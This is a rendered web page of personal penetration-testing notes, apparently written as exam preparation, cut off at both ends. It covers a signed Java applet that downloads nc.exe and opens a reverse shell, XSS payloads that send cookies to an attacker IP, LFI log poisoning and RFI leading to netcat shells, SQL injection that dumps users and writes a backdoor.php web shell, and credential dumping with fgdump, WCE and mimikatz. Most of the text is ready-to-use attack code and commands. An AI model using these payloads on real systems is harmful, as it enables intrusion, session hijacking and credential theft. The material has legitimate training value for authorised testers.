                OutputStream out <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedOutputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span>
                        FileOutputStream<span style="color:#f92672">(</span>outputFile<span style="color:#f92672">));</span>
                <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>2048<span style="color:#f92672">];</span>
                <span style="color:#66d9ef">for</span> <span style="color:#f92672">(;;)</span> <span style="color:#f92672">{</span>
                    <span style="color:#66d9ef">int</span> nBytes <span style="color:#f92672">=</span> bufIn<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">(</span>buffer<span style="color:#f92672">);</span>
                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>nBytes <span style="color:#f92672">&lt;=</span> 0<span style="color:#f92672">)</span> <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
                    out<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>buffer<span style="color:#f92672">,</span> 0<span style="color:#f92672">,</span> nBytes<span style="color:#f92672">);</span>
                <span style="color:#f92672">}</span>
                out<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>
                out<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
                in<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
                f <span style="color:#f92672">=</span> Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cmd.exe /c &#34;</span> <span style="color:#f92672">+</span> expath <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; 192.168.1.23 443 -e cmd.exe&#34;</span><span style="color:#f92672">);</span> <span style="color:#75715e">// change to Kali IP
</span><span style="color:#75715e"></span>            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span><span style="color:#f92672">(</span>IOException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
        <span style="color:#f92672">}</span>
        <span style="color:#75715e">/* ended here and commented out below for bypass */</span>
        <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception exception<span style="color:#f92672">)</span>
        <span style="color:#f92672">{</span>
            exception<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">javac -source 1.7 -target 1.7 Java.java <span style="color:#75715e"># compile to class</span>
echo <span style="color:#e6db74">&#34;Permissions: all-permissions&#34;</span> &gt; /root/manifest.txt
jar cvf Java.jar Java.class <span style="color:#75715e"># compress class into jar</span>
keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
jarsigner -keystore mykeystore -keypass mykeypass -storepass password123 -signedjar SignedJava.jar Java.jar signapplet
mv Java.class SignedJava.jar /var/www/html/
echo <span style="color:#e6db74">&#39;&lt;applet width=&#34;1&#34; height=&#34;1&#34; id=&#34;Java Secure&#34; code=&#34;Java.class&#34; archive=&#34;SignedJava.jar&#34;&gt;&lt;param name=&#34;1&#34; value=&#34;http://192.168.1.23:80/evil.exe&#34;&gt;&lt;/applet&gt;&#39;</span> &gt; /var/www/html/java.html
cp /usr/share/windows-binaries/nc.exe /var/www/html/evil.exe
</code></pre></div><h1 id="web-application-attacks">Web Application Attacks</h1>
<h2 id="essential-firefox-add-ons">Essential Firefox Add-ons</h2>
<ul>
<li>Cookie Manager+</li>
<li>Tamper Data</li>
</ul>
<h2 id="xss">XSS</h2>
<h3 id="browser-redirection-and-iframe-injection">Browser Redirection and IFRAME Injection</h3>
<p>Forcing a victim to visit a webpage. Use an IFRAME as it is stealthy. This redirection may be used to redirect a victim browser to a client side attack or to an information gathering script. Listen for the connection: <code>nc -lvp 80</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://[your ip]/report&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</code></pre></div><p>Tools:</p>
<ul>
<li>User Agent Parser: <a href="https://developers.whatismybrowser.com/useragents/parse/#parse-useragent">https://developers.whatismybrowser.com/useragents/parse/#parse-useragent</a> (for exploiting outdated clients)</li>
</ul>
<h3 id="stealing-cookies-and-session-information">Stealing Cookies and Session Information</h3>
<h4 id="get-request">GET Request</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://[your ip]/bogus.php?output=&#34;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;&lt;/<span style="color:#f92672">script</span>&gt;
</code></pre></div><h4 id="post-request">POST Request</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">var http = new XMLHttpRequest();var url = &#34;/flatfilelogin/shout.php&#34;;var params = &#34;input_name=stolen<span style="color:#960050;background-color:#1e0010">&amp;</span>input_text=&#34; + document.cookie;http.open(&#34;POST&#34;, url, true);http.setRequestHeader(&#34;Content-type&#34;, &#34;application/x-www-form-urlencoded&#34;);http.send(params);
</code></pre></div><h2 id="file-inclusion">File Inclusion</h2>
<h3 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h3>
<p>Ability to &ldquo;include&rdquo; any local file in the filesystem and execute PHP code within the included files.</p>
<p>Vulnerability:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>( $_GET[<span style="color:#e6db74">&#39;LANG&#39;</span>] ) ) { $lang <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;LANG&#39;</span>];}
<span style="color:#66d9ef">else</span> { $lang <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;en&#39;</span>;}
<span style="color:#66d9ef">include</span>( $lang <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.php&#39;</span> );
</code></pre></div><p>With this, you can access files that are on the system by changing the value of the <code>LANG</code> attribute and using directory path traversal. But notice in the vulnerable code, it appends <code>.php</code> to the end, to bypass that in PHP versions below 5.3, use a null byte (<code>%00</code>):</p>
<pre><code>LANG=../../../../../../../../windows/system32/drivers/etc/hosts%00
</code></pre><p>If we could get PHP code written to somewhere on the server filesystem, we can get a shell. Assuming, we can&rsquo;t directly upload a file to the remote filesystem, we can contaminate log files to include PHP code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ nc 192.168.1.23 <span style="color:#ae81ff">80</span>
&lt;?php echo shell_exec<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;cmd&#39;</span><span style="color:#f92672">])</span>;?&gt;


HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
</code></pre></div><p>This connection results in the following text written to the Apache log files located in <code>C:\xampp\apache\logs\access.log</code>, effectively introducing PHP code into a file on the local filesystem of the webserver:</p>
<pre><code>192.168.1.23 - - [17/Apr/2013:06:22:00 -0400] &quot; &lt;?php echo shell_exec($_GET['cmd']);?&gt;&quot; 400 1047
</code></pre><p>Let&rsquo;s try including that log file and executing the malicious PHP code stored within it, by putting the pathname into the <code>LANG</code> attribute, and putting <code>ipconfig</code> in the <code>cmd</code> attribute:</p>
<pre><code>http://192.168.1.23/addguestbook.php?name=hi&amp;comment=&amp;cmd=ipconfig&amp;LANG=../../../../../../../xampp/apache/logs/access.log%00
</code></pre><p>The result may be a little hard to see, as the entire log file will be dumped along with the command&rsquo;s output.</p>
<p>Let&rsquo;s get a shell now by transferring over &ldquo;nc.exe&rdquo; to the webserver using the TFTP technique. First, start the TFTP server on the attacker machine with <code>atftpd --daemon --port 69 /tftp</code> and copying &ldquo;nc.exe&rdquo; over to the hosting directory with <code>cp /usr/share/windows-binaries/nc.exe /tftp</code>. Now execute the <code>tftp</code> on the webserver using LFI. Remember to URL encode the command string within the &ldquo;cmd&rdquo; attribute:</p>
<pre><code>http://192.168.1.23/addguestbook.php?name=hi&amp;comment=&amp;cmd=tftp+-i+[kali ip]+get+nc.exe&amp;LANG=../../../../../../../xampp/apache/logs/access.log%00
</code></pre><p>The webpage will start to hang for a while, as it awaits the output from the <code>tftp</code> command that is downloading &ldquo;nc.exe&rdquo;. Once done, execute the downloaded &ldquo;nc.exe&rdquo; and create a reverse shell:</p>
<pre><code>http://192.168.1.23/addguestbook.php?name=hi&amp;comment=&amp;cmd=nc.exe+[kali ip]+[port]+-e+cmd.exe&amp;LANG=../../../../../../../xampp/apache/logs/access.log%00
</code></pre><h4 id="lfi-summary">LFI Summary</h4>
<h5 id="techniques">Techniques</h5>
<pre><code>param=/etc/passwd
param=/etc/passwd%00 # null byte terminate
param=../../../../../../etc/passwd%00 # directory traversal
param=php://filter/convert.base64-encode/resource=/etc/php5/apache2/php.ini%00 # filter, for files that contain bad chars PHP cannot interpret
param=expect://whoami # expect wrapper, direct code execution, not enabled by default
param=php://input # php code execution, send php code in POST data `&lt;? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?&gt;`
param=/proc/self/environ # if readable, write php code in &quot;User Agent&quot; data, and it'll appear within environ
param=/proc/self/fd/0 # if readable, write php code in &quot;referer&quot; data, and it'll appear within file descriptor. make sure to brute force the fd number 0-10+
param=/var/lib/php/session # php sessions
param=/tmp/ # php sessions
</code></pre><p>Also phpinfo() pages can be exploited in LFI as well. phpinfo() script contains the values of PHP variables, INCLUDING any values set via GET, POST or uploaded FILES. Creating tmp files, getting the location of them, and performing LFI on them leads to code execution. <a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a></p>
<h5 id="log-poisoning">Log Poisoning</h5>
<pre><code># Default Locations
RHEL / Red Hat / CentOS / Fedora Linux Apache log file location   /var/log/httpd/access_log     /var/log/httpd/error_log
Debian / Ubuntu Linux Apache log file location                    /var/log/apache2/access.log   /var/log/apache2/error.log
FreeBSD Apache log file location                                  /var/log/httpd-access.log     /var/log/httpd-error.log

# For custom log locations, find the &quot;CustomLog&quot; and &quot;ErrorLog&quot; definitions within these files:
/usr/local/etc/apache2/httpd.conf
/etc/apache2/apache2.conf
/etc/httpd/conf/httpd.conf

# Windows web roots
C:/xampp/htdocs/
C:/wamp/www/
C:/Inetpub/wwwroot/
</code></pre><h4 id="fimap"><code>fimap</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">fimap -s -u <span style="color:#e6db74">&#39;http://192.168.1.23/classes/phpmailer/class.cs_phpmailer.php?classes_dir=&#39;</span>
</code></pre></div><h3 id="remote-file-inclusion-rfi">Remote File Inclusion (RFI)</h3>
<p>Ability to &ldquo;include&rdquo; remote files and execute PHP code within the included files. Easier to exploit, but less common than LFIs.</p>
<p>Just like getting a shell with LFI, start the TFTP server and prepare &ldquo;nc.exe&rdquo;. Also, prepare a malicious file called &ldquo;evil.txt&rdquo; and host it within the attacker&rsquo;s webserver and start apache with <code>service apache2 start</code>:</p>
<pre><code>&lt;?php echo shell_exec(&quot;tftp -i [kali ip] get nc.exe&quot;);?&gt;
</code></pre><p>Call the webpage to include &ldquo;evil.txt&rdquo; and execute the PHP code within it to download &ldquo;nc.exe&rdquo; from our machine using <code>tftp</code>. It may take a sec to download:</p>
<pre><code>http://192.168.1.23/addguestbook.php?name=hi&amp;comment=&amp;LANG=http://[kali ip]/evil.txt%00
</code></pre><p>Change &ldquo;evil.txt&rdquo; on the attacker&rsquo;s webserver to invoke the <code>nc.exe</code> command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#34;nc.exe [kali ip] [port] -e cmd.exe&#34;</span>);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>Prepare a listener and refresh the webpage to pop a reverse shell.</p>
<h4 id="rfi-summary">RFI Summary</h4>
<p>Alternatively, to avoid constantly changing the php file, host this instead, and visit <code>http://192.168.1.23/addguestbook.php?name=hi&amp;comment=&amp;LANG=http://[kali ip]/evil.txt%00&amp;cmd=whoami</code>. Change <code>cmd</code> to the command you want to execute:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><pre><code># Data wrapper allows for direct code execution
param=data:text/plain,&lt;?system($_GET['x']);?&gt;&amp;x=whoami
param=data:,&lt;?system($_GET['x']);?&gt;&amp;x=whoami
param=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&amp;x=ls
</code></pre><h3 id="sql">SQL</h3>
<h4 id="simple-authentication-bypass">Simple Authentication Bypass</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;?&#39;</span> <span style="color:#66d9ef">and</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;?&#39;</span>;
<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;wronguser&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;<span style="color:#f92672">#</span><span style="color:#e6db74">&#39; and password=&#39;</span><span style="color:#f92672">?</span><span style="color:#e6db74">&#39;;
</span><span style="color:#e6db74">select * from users where name=&#39;</span>wronguser<span style="color:#e6db74">&#39; or 1=1 limit 1;#&#39;</span> <span style="color:#66d9ef">and</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;?&#39;</span>; <span style="color:#f92672">#</span> <span style="color:#66d9ef">when</span> server expects <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">result</span>
</code></pre></div><h4 id="database-enumeration-and-extraction">Database Enumeration and Extraction</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> comments <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=?</span>;
<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> comments <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">738</span><span style="color:#e6db74">&#39;; # test for sql injection
</span><span style="color:#e6db74">select * from comments where id=738 order by 6; # enumerate number of columns
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,5,6; # union select with same number of columns, to see which numbers gets printed on webpage
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,@@version,6; # discover MySQL version
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,user(),6; # discover current user being used for db connection
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,table_name,6 from information_schema.tables; # dump all tables and find interesting one
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,column_name,6 from information_schema.columns where table_name=&#39;</span>users<span style="color:#e6db74">&#39;; # dump all column names from that table
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,concat(name,0x3a,password),6 from users; # dump users information. 0x3a can be substituted with &#39;</span>:<span style="color:#e6db74">&#39;
</span></code></pre></div><h4 id="reading-files-with-sqli">Reading Files with SQLi</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> comments <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">738</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,load_file(<span style="color:#e6db74">&#39;c:/windows/system32/drivers/etc/hosts&#39;</span>),<span style="color:#ae81ff">6</span>;
</code></pre></div><h4 id="writing-files-with-sqli">Writing Files with SQLi</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> comments <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">738</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#34;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&#34;</span>,<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#39;c:/xampp/htdocs/backdoor.php&#39;</span>;
</code></pre></div><pre><code>192.168.1.23/backdoor.php?cmd=ipconfig
</code></pre><h4 id="mssql-xp_cmdshell-and-dumping">MSSQL Xp_Cmdshell and Dumping</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nmap -T4 -n -p <span style="color:#ae81ff">1433</span> --script ms-sql-xp-cmdshell --script-args mssql.username<span style="color:#f92672">=</span>sa,mssql.password<span style="color:#f92672">=</span>abc,ms-sql-xp-cmdshell.cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whoami&#39;</span> 192.168.1.23 <span style="color:#75715e"># command execution</span>
nmap -T4 -n -p <span style="color:#ae81ff">1433</span> --script ms-sql-tables --script-args mssql.username<span style="color:#f92672">=</span>sa,mssql.password<span style="color:#f92672">=</span>abc 192.168.1.23 <span style="color:#75715e"># dump tables information</span>
nmap -T4 -n -p <span style="color:#ae81ff">1433</span> --script ms-sql-query --script-args mssql.username<span style="color:#f92672">=</span>sa,mssql.password<span style="color:#f92672">=</span>abc,mssql.database<span style="color:#f92672">=</span>bankdb,ms-sql-query.query<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;select * from tblCustomers;&#34;</span> 192.168.1.23 <span style="color:#75715e"># sql query</span>
</code></pre></div><h4 id="mysql-cli">MySQL CLI</h4>
<p>Low-priv shells may not be interactive, so remember to use <code>-e</code> to execute SQL queries:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql -uroot -pzaq1xsw2cde3 -e <span style="color:#e6db74">&#39;show databases;&#39;</span>
mysqladmin -u root password YOURNEWPASSWORD <span style="color:#75715e"># resetting root password, good for post exploitation, may not work all the time</span>
</code></pre></div><p>Unlike MSSQL, MySQL can&rsquo;t directly execute commands, but with UDF (user defined funtion), command execution will be possible.</p>
<ul>
<li>mysqladmin -u root password YOURNEWPASSWORD</li>
<li><a href="https://www.rapid7.com/db/modules/exploit/multi/mysql/mysql_udf_payload">https://www.rapid7.com/db/modules/exploit/multi/mysql/mysql_udf_payload</a></li>
<li><a href="http://bernardodamele.blogspot.sg/2009/01/command-execution-with-mysql-udf.html">http://bernardodamele.blogspot.sg/2009/01/command-execution-with-mysql-udf.html</a></li>
<li><a href="https://hackmag.com/security/hacking-mysql-databases-methods-and-tools/">https://hackmag.com/security/hacking-mysql-databases-methods-and-tools/</a></li>
</ul>
<h4 id="oracle">Oracle</h4>
<p>Four things to connect to an Oracle DB:</p>
<ol>
<li>
<p>IP</p>
</li>
<li>
<p>Port</p>
</li>
<li>
<p>Service Identifier (SID) (Database)</p>
</li>
<li>
<p>Username/Password</p>
</li>
<li>
<p>Determine Oracle version</p>
</li>
</ol>
<ul>
<li>nmap</li>
<li>auxiliary/scanner/oracle/tnslsnr_version</li>
</ul>
<ol start="2">
<li>Determine Oracle SID</li>
</ol>
<ul>
<li>oscanner</li>
<li>auxiliary/scanner/oracle/sid_enum</li>
<li>auxiliary/scanner/oracle/sid_brute</li>
</ul>
<ol start="3">
<li>Guess/Bruteforce User/Pass</li>
</ol>
<ul>
<li>oscanner</li>
<li>auxiliary/scanner/oracle/oracle_login</li>
</ul>
<ol start="4">
<li>Privilege Escalation via PL/SQL Injection</li>
</ol>
<ul>
<li>auxiliary/sqli/oracle/lt_findricset_cursor</li>
</ul>
<ol start="5">
<li>Manipulate Data/Post Exploitation</li>
<li>Cover Tracks</li>
</ol>
<p>Resources:</p>
<ul>
<li>Oracle Hacking Methodology with Metasploit: <a href="http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf">http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf</a></li>
<li>Sqlplus and code execution example: <a href="https://www.adampalmer.me/iodigitalsec/2013/08/12/first-steps-in-oracle-penetration-testing/">https://www.adampalmer.me/iodigitalsec/2013/08/12/first-steps-in-oracle-penetration-testing/</a></li>
<li>Setting up Oracle in Kali: <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux</a> (felt troublesome, didn&rsquo;t install)</li>
<li>Setting up Oracle in Kali 2.0: <a href="https://blog.zsec.uk/msforacle/">https://blog.zsec.uk/msforacle/</a></li>
</ul>
<p>Tools:</p>
<ul>
<li>Oscanner: <a href="https://tools.kali.org/vulnerability-analysis/oscanner">https://tools.kali.org/vulnerability-analysis/oscanner</a>
<ul>
<li><code>oscanner -s 192.168.1.23 -P 1521</code></li>
</ul>
</li>
<li>DBPwAudit: <a href="https://tools.kali.org/vulnerability-analysis/dbpwaudit">https://tools.kali.org/vulnerability-analysis/dbpwaudit</a></li>
</ul>
<h4 id="other-notes">Other Notes</h4>
<h3 id="web-application-proxies">Web Application Proxies</h3>
<ul>
<li>Firefox &gt; Alt &gt; Tools &gt; Tamper Data &gt; Start Tamper</li>
<li>BurpSuite</li>
</ul>
<h4 id="burpsuite">BurpSuite</h4>
<p>Wonderful tool, great for SQLi, RFI, LFI, remote code execution, and nearly all web attacks.</p>
<ul>
<li>Proxy</li>
<li>Repeater
<ul>
<li>Ctrl-r to send request to repeater</li>
<li>Ctrl-g to go in repeater, manually set in User Options (Tab) &gt; Misc &gt; Hotkeys &gt; Edit hotkeys &gt; Issue Repeater request &gt; Ctrl-g</li>
<li>Ctrl-u to URL encode</li>
</ul>
</li>
</ul>
<h3 id="automated-sql-injection-tools">Automated SQL Injection Tools</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sqlmap -u http://192.168.1.23 --crawl<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#75715e"># crawls link with depth 1 and automatically find GET SQLi</span>
sqlmap -u http://192.168.1.23/comment.php?id<span style="color:#f92672">=</span><span style="color:#ae81ff">738</span> --dbms<span style="color:#f92672">=</span>mysql --dump --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
sqlmap -u http://192.168.1.23/comment.php?id<span style="color:#f92672">=</span><span style="color:#ae81ff">738</span> --dbms<span style="color:#f92672">=</span>mysql --os-shell
sqlmap -u http://192.168.1.23/login.php --data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;username=john&amp;password=smith&#39;</span> <span style="color:#75715e"># POST using data</span>
sqlmap -r login_request -p username,password <span style="color:#75715e"># POST, using a BurpSuite request</span>
</code></pre></div><h1 id="password-attacks">Password Attacks</h1>
<h2 id="preparing-for-brute-force">Preparing for Brute Force</h2>
<h3 id="dictionary-files">Dictionary Files</h3>
<p><code>/usr/share/wordlists/</code></p>
<h3 id="key-space-brute-force">Key-space Brute Force</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">crunch <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">6</span> 0123456789ABCDEF -o crunch1.txt <span style="color:#75715e"># length 6 0-9A-F</span>
crunch <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">4</span> -f /usr/share/crunch/charset.lst mixalpha -o mixedalpha.txt <span style="color:#75715e"># length 4 a-zA-Z</span>
crunch <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> -p test ing <span style="color:#ae81ff">123</span> <span style="color:#75715e"># crunch will find all combinations of those 3 words, eg. 123ingtest</span>
</code></pre></div><p>If a pattern is found within passwords you cracked like:</p>
<pre><code>david: Abc$#123
mike: Jud()666
Judy: Hol&amp;&amp;278
</code></pre><p>We can generate a customized password list:</p>
<pre><code># @ - Lower case alpha characters
# , - Upper case alpha characters
# % - Numeric characters
# ^ - Special characters including space

crunch 8 8 -t ,@@^^%%% # this will generate 160GB of data
</code></pre><h3 id="pwdump-and-fgdump">Pwdump and Fgdump</h3>
<p>Password Hash Types in Security Accounts Manager (SAM) Database:</p>
<ul>
<li>LAN Manager (LM)
<ul>
<li>DES</li>
<li>Windows NT-2003</li>
<li>Passwords longer than 7 chars split into two strings and is hashed separately</li>
<li>Passwords converted to uppercase before hashing</li>
<li>No salt</li>
</ul>
</li>
<li>NT LAN Manager (NTLM)
<ul>
<li>MD4</li>
<li>Windows Vista+</li>
<li>No limit to two 7 char parts</li>
<li>Case sensitive</li>
<li>No salt</li>
</ul>
</li>
</ul>
<p>SAM db cannot be copied while OS is running, however in-memory attacks to dump the hashes can be mounted using various techniques. Pwdump and fgdump are good examples of tools that are able to perform in-memory attacks, as they inject a DLL containing the hash dumping code into the Local Security Authority Subsystem (LSASS) process, which has the necessary privileges to extract the hashes.</p>
<p>Fgdump and pwdump are similar, but fgdump attempts to kill local AV before attempting to dump the hashes and handle cached passwords and protected storage data as well. <a href="http://foofus.net/goons/fizzgig/">http://foofus.net/goons/fizzgig/</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">fgdump.exe
</code></pre></div><p>You can crack them online at <a href="http://cracker.offensive-security.com/">http://cracker.offensive-security.com/</a> or use <code>john [hashes]</code> on Kali.</p>
<pre><code>Jason:502:aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3:::
[username]:[relative identifier (500 - admin, 502 - kerboros)]:[LM hash]:[NT hash]
</code></pre><h3 id="windows-credential-editor-wce">Windows Credential Editor (WCE)</h3>
<p>WCE can steal NTLM credentials from memory and dump cleartext passwords stored by Windows authentication packages installed on the target system such as msv1_0.dll, kerberos.dll, and digest.dll.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">wce -l # default, dumps NTLM hashes fromm LSASS process memory, more secure in terms of OS stability
wce -w # dumps plaintext passwords using DLLs
</code></pre></div><p><a href="https://www.ampliasecurity.com/research/windows-credentials-editor/">https://www.ampliasecurity.com/research/windows-credentials-editor/</a></p>
<h3 id="mimikatz">mimikatz</h3>
<pre><code>privilege::debug

# Dump Passwords
sekurlsa::logonpasswords

# Passing the Hash
